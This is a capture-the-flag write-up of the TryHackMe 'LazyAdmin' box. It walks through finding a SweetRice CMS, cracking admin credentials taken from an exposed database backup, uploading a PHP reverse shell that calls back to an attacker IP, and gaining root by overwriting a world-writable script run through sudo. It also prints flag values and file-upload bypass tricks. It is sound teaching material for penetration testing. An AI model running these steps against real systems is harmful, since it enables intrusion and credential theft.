# LazyAdmin — Writeup

> **Platform:** TryHackMe
> **Difficulty:** Easy
> **Date Completed:** 2026-02-20
> **Session File:** `sessions/2026-02-20-lazyadmin/session.md`

## TL;DR

A Linux box running SweetRice CMS 1.5.1 hidden in a subdirectory. The CMS exposed MySQL backups containing admin credentials with an MD5-hashed password. After cracking the hash and logging in, we uploaded a PHP reverse shell via an arbitrary file upload vulnerability. Privilege escalation through a sudo misconfiguration — a Perl script we could run as root called a world-writable shell script. Classic CMS misconfiguration → file upload → sudo chain.

---

## What We're Practicing

| Skill | Tier | What We Practiced |
|---|---|---|
| File Upload Bypass | Tier 2 | .php5 extension bypass on SweetRice media upload |
| Access Control Flaws | Tier 1 | Sudo misconfiguration — writable dependency in privileged script |
| Authentication Attacks | Tier 1 | Credential extraction from exposed database backup |

---

## The Attack — Step by Step

### Phase 1: Reconnaissance

**What we did:**
```bash
# Quick scan
nmap -sC -sV -oN sessions/lazyadmin/nmap-initial.txt 10.67.162.142

# Full port scan
nmap -p- -T4 -oN sessions/lazyadmin/nmap-full.txt 10.67.162.142
```

**What we found:**

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 7.2p2 Ubuntu |
| 80 | HTTP | Apache 2.4.18 (Ubuntu) — default page |

Only two ports. Minimal attack surface. The Apache default page means the real web application is hiding in a subdirectory — which means we need directory brute forcing.

**Decision point:** With only HTTP and SSH, the web application is our only realistic attack path. SSH brute force is rarely productive without known usernames and is loud. Let's enumerate HTTP.

---

### Phase 2: Enumeration

#### Directory Brute Force

```bash
# Discover hidden directories
gobuster dir -u http://10.67.162.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o sessions/lazyadmin/gobuster.txt
```

**What gobuster does:** Sends HTTP requests for every word in the wordlist as a directory name (`/admin`, `/backup`, `/content`, etc.) and reports which ones return valid responses (200, 301, 302) vs 404s.

**Found:** `/content/` → SweetRice CMS 1.5.1

#### CMS Enumeration

Once we found SweetRice, we explored its structure:

```bash
# Check for known vulnerabilities
searchsploit sweetrice

# Manual browsing revealed:
# /content/as/         → Admin login panel
# /content/inc/        → Include directory (interesting)
# /content/inc/mysql_backup/  → Database backups (!)
```

**The gold mine:** SweetRice 1.5.1 exposes MySQL backup files by default at `/content/inc/mysql_backup/`. This is a **critical misconfiguration** — the backup contains the entire database in a serialized PHP format, including admin credentials.

```bash
# Download the backup
wget http://10.67.162.142/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

#### Credential Extraction

Inside the backup file, we found serialized admin credentials:

- **Username:** `manager`
- **Password hash:** `42f749ade7f9e195bf475f37a44cafcb` (MD5)

```bash
# Save the hash and crack it
echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Result: Password123
john --show --format=raw-md5 hash.txt
```

**Why john over hashcat?** For simple hash types like raw MD5 with a standard wordlist, john is faster to invoke — no need to look up hashcat mode numbers. `Password123` cracks instantly — it's in the first few thousand entries of rockyou.txt.

**Credentials:** `manager:Password123`

**Decision point:** We have admin credentials for a CMS with known file upload vulnerabilities. Let's get a shell.

---

### Phase 3: Exploitation — Initial Access

**The vulnerability:**
- **Name:** SweetRice 1.5.1 Arbitrary File Upload (EDB-40716)
- **Type:** Unrestricted file upload via admin panel
- **Why it works:** SweetRice's media center upload feature doesn't properly restrict file types. While it blocks `.php`, it doesn't block alternative PHP extensions like `.php5`, `.phtml`, or `.pht`. Apache is configured to process `.php5` files as PHP — so uploading a shell with a `.php5` extension bypasses the filter while still executing as PHP code.
- **Affected software:** SweetRice CMS 1.5.1
- **Required access:** Admin panel login

**The developer mistake:** File upload validation by extension blacklist instead of whitelist. They blocked `.php` but forgot about `.php5`, `.phtml`, `.pht`, and other extensions that Apache's `mod_php` processes. The secure approach is to whitelist allowed extensions (`.jpg`, `.png`, `.pdf`) and reject everything else.

**The attack:**

```bash
# 1. Prepare a PHP reverse shell
# Copy the pentestmonkey PHP reverse shell and edit it:
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5

# Edit shell.php5 — change these lines:
#   $ip = 'YOUR_ATTACKER_IP';
#   $port = 4444;

# 2. Start a listener (we used ghost-listen)
python3 tools/ghost-listen.py --lport 4444 &

# 3. Upload the shell
# Navigate to: http://10.67.162.142/content/as/
# Login with manager:Password123
# Go to Media Center → Upload
# Select shell.php5 → Upload

# 4. Trigger the shell
curl http://10.67.162.142/content/attachment/shell.php5
```

**What happens when you trigger the shell:**
1. Apache receives the request for `shell.php5`
2. `mod_php` recognizes `.php5` as a PHP extension and processes it
3. The PHP script opens a TCP socket back to your attacker IP on port 4444
4. It redirects stdin/stdout/stderr to the socket
5. It spawns `/bin/sh` — giving you an interactive shell through the connection

**Result:** Shell as `www-data` on `THM-Chal`

---

### Phase 4: Post-Exploitation & Privilege Escalation

**Situation:** We're `www-data`. Let's find a way to root.

**Enumeration:**
```bash
# Standard first checks
whoami          # www-data
id              # uid=33(www-data)
sudo -l         # This is where it gets interesting
```

**sudo -l output:**
```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

This means `www-data` can run a specific Perl script as root, with no password required. Let's examine the chain:

```bash
# What does the Perl script do?
cat /home/itguy/backup.pl
```
```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

The Perl script calls `/etc/copy.sh`. Let's check the permissions on that:

```bash
ls -la /etc/copy.sh
# -rw-r--rwx 1 root root ... /etc/copy.sh
```

**The privesc vector:**
- **Type:** Sudo misconfiguration + writable dependency chain
- **Why it works:** Three things combined to make this exploitable:
  1. `www-data` can run `backup.pl` as root via sudo (NOPASSWD)
  2. `backup.pl` calls `system("sh", "/etc/copy.sh")` — it executes another script
  3. `/etc/copy.sh` is world-writable (`-rw-r--rwx` — the last `rwx` means any user can write to it)

  So the chain is: `www-data` → `sudo perl backup.pl` (runs as root) → `backup.pl` calls `/etc/copy.sh` (as root) → we control `/etc/copy.sh`. Whatever we put in `copy.sh` executes as root.

- **What should the admin have done?** Either: (a) don't give `www-data` sudo access at all, (b) if the backup script is needed, ensure ALL scripts in the execution chain are owned by root and not world-writable, or (c) use full paths and restrict permissions.

**The escalation:**
```bash
# Overwrite /etc/copy.sh with a command to read the root flag
# (Or you could put a reverse shell here for full root shell)
echo "cat /root/root.txt" > /etc/copy.sh

# Execute the sudo chain
sudo /usr/bin/perl /home/itguy/backup.pl
# Output: THM{6637f41d0177b6f37cb20d775124699f}

# For a full root shell instead:
echo "bash -i" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
# Drops you into root shell
```

**Result:** Root access confirmed.

---

## Flags

| Flag | Value | Location |
|---|---|---|
| User | `THM{63e5bce9271952aad1113b6f1ac28a07}` | `/home/itguy/user.txt` |
| Root | `THM{6637f41d0177b6f37cb20d775124699f}` | `/root/root.txt` |

---

## Tools Used

| Tool | Purpose | Why This Tool |
|---|---|---|
| **nmap** | Port scanning + version detection | Standard first step. Two ports = quick scan, clean picture. |
| **gobuster** | Directory brute forcing | Found `/content/` — the hidden CMS. Without this, we'd be staring at an Apache default page. |
| **searchsploit** | Exploit database search | Quickly confirmed SweetRice 1.5.1 has known file upload vulns (EDB-40716). |
| **john** | MD5 hash cracking | Cracked `Password123` from the database backup instantly. Simple hash = simple tool. |
| **ghost-listen.py** | Reverse shell handler | Caught the PHP reverse shell callback. Daemon/client pattern means we can run commands without juggling shell sessions. First engagement using ghost tools. |

---

## Bug Bounty Relevance

- **Would this work on a real target?** SweetRice CMS is uncommon in the wild, BUT every piece of this attack chain shows up constantly in bug bounties:
  - **Exposed backup files** — database dumps, `.sql` files, config backups left in web directories. This is a real finding worth submitting.
  - **Credentials in backups** — even if the backup itself isn't directly exploitable, credentials often get reused across services.
  - **File upload bypass** — extension blacklisting is everywhere. Testing `.php5`, `.phtml`, `.pht`, `.php.jpg`, `.php%00.jpg` and similar bypasses is a standard bug bounty technique.
  - **MD5-hashed passwords** — finding MD5 (unsalted) password storage is a valid security finding on most programs.

- **Where would you find this in the wild?**
  - Exposed backup directories: Run gobuster/dirsearch with backup-focused wordlists. Check `/backup/`, `/db/`, `/sql/`, `/inc/`, `/.git/`, `/wp-content/debug.log`.
  - File upload bypasses: Any CMS or web app with file upload functionality. Test alternative extensions, double extensions, null bytes, content-type manipulation.
  - Sudo misconfigurations: After landing on a Linux server (via RCE or SSRF → internal access), `sudo -l` is always one of your first checks.

- **What's the bounty potential?**
  - Exposed database backup with credentials → Medium-High ($500-5,000) depending on what's in the database
  - File upload → RCE → Critical ($5,000-20,000+)
  - The chain (backup disclosure → credential extraction → admin access → file upload → RCE) is a very strong report

- **Recon pattern to remember:** On any web target with a CMS:
  1. Identify the CMS and version (`searchsploit`, Wappalyzer, page source)
  2. Check for default/exposed directories (backup dirs, include dirs, admin panels)
  3. Test file upload functionality with multiple bypass techniques
  4. If you get creds, test them everywhere (admin panels, SSH, other services)

---

## Lessons Learned

### What worked
- **gobuster was essential** — the real application was hidden in `/content/`. Without directory brute forcing, we'd have nothing.
- **Checking for exposed backups** — `/content/inc/mysql_backup/` was the key to the entire engagement. Always check include/backup directories.
- **Following the sudo chain** — `sudo -l` showed us the path, but we had to trace what `backup.pl` called, and then check permissions on `/etc/copy.sh`. Three links in the chain.
- **ghost-listen daemon pattern** — first time using it in an engagement, worked cleanly for catching the reverse shell.

### What didn't work / rabbit holes
- No major rabbit holes on this box — it's linear and well-designed for learning. The main risk was not finding `/content/` if you don't run gobuster with a good wordlist.

### Key takeaways
1. **Extension blacklisting is weak.** If a site blocks `.php`, try `.php5`, `.phtml`, `.pht`, `.phar`. Apache processes all of these as PHP by default.
2. **Database backups in web directories are a goldmine.** Real-world bug bounty finding. Always check `/inc/`, `/backup/`, `/db/`, `/data/` directories.
3. **Follow the entire sudo chain.** `sudo -l` shows you what you can run as root, but the exploitability might be in a dependency — a script called by the script you can sudo.
4. **World-writable files in privileged execution paths are critical.** If root runs it and you can write to it, you own root.

### Skills to practice next
- File upload bypass techniques — try more exotic bypasses (content-type manipulation, double extensions, null bytes)
- Manual exploitation without ghost-listen — understand raw netcat listener workflow
- SweetRice-specific exploit module for ghost-exploit.py (noted for tool development)

---

## References

- [SweetRice 1.5.1 — Arbitrary File Upload (EDB-40716)](https://www.exploit-db.com/exploits/40716)
- [SweetRice 1.5.1 — Backup Disclosure (EDB-40718)](https://www.exploit-db.com/exploits/40718)
- [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- Knowledge file: `knowledge/privesc-linux.md` (Sudo section)
- Knowledge file: `knowledge/payloads.md` (PHP shells, shell stabilization)
- Tool playbook: `directives/tool-playbooks.md` (gobuster, john, ghost-listen)
